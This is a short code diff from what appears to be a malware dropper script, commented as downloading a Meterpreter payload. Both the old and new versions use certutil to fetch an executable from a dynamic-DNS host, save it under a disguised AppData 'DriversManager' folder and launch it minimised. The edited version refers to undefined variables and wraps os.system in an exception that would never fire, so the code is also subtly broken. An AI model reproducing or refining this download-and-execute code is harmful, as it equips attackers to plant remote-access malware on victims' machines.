@@ -6,9 +6,12 @@ d = os.environ["SystemDrive"]
 usr = os.environ["USERNAME"]
 # FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
 def dwnExec():
-    dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\setup\\rvM32.exe"'.format(d, usr)
-    os.system(dwn)
-    exc = "START /MIN {}\\Users\\{}\\AppData\\setup\\rvM32.exe".format(d, usr)
-    os.system(exc)
+    exc = "START /MIN {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe".format(letter_drive_path, current_user)
+    try:
+        os.system(exc)
+    except FileNotFoundError:
+        dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\rvM32.exe"'.format(letter_drive_path, current_user)
+        os.system(dwn)
+        os.system(exc)
 
 dwnExec()
